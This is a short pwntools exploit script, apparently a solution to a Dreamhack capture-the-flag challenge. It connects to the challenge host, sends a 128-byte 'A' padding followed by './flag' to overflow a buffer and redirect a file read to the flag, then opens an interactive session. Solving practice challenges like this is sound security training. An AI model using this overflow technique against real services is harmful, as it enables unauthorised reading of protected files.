from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22537
r = remote(HOST, PORT)

r.sendlineafter(b'meow?', b'A' * 128 + b'./flag')
r.interactive()